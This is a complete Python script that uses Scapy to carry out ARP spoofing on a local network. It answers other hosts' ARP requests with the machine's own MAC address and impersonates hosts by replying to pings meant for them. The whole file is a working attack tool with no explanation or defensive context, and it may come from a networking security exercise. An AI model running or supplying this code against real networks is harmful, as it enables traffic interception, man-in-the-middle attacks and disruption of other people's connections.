import sys

from threading import Thread
from scapy.all import *

INTERFACE = "eth0"
MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
MY_IP_ADDRESS = get_if_addr(INTERFACE)

'''
Approach 2: Using AnsweringMachine
$ python3 arp_spoof.py
'''

class ARPSpoofer(AnsweringMachine):
    def is_request(self, request):
        return request.haslayer('ARP') and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS
    
    def make_reply(self, request):
        response = Ether()/ARP()

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS

        response[ARP].op = 2
        response[ARP].hwsrc = MY_MAC_ADDRESS
        response[ARP].hwdst = request[ARP].hwsrc
        response[ARP].psrc = request[ARP].pdst
        response[ARP].pdst = request[ARP].psrc

        return response[ARP]

class PingResponder(AnsweringMachine):
    def is_request(self, request):
        return request.haslayer('ICMP') and request[ICMP].type == 8 and request[IP].dst != MY_IP_ADDRESS
    
    def make_reply(self, request):
        response = Ether()/IP()/ICMP()/""

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS

        response[IP].src = request[IP].dst
        response[IP].dst = request[IP].src

        response[ICMP].type = 0
        response[ICMP].id = request[ICMP].id
        response[ICMP].seq = request[ICMP].seq

        response[Raw].load = request[Raw].load

        return response[IP]

arp_spoofer = Thread(target=ARPSpoofer())
arp_spoofer.start()

ping_responder = Thread(target=PingResponder())
ping_responder.start()

arp_spoofer.join()
ping_responder.join()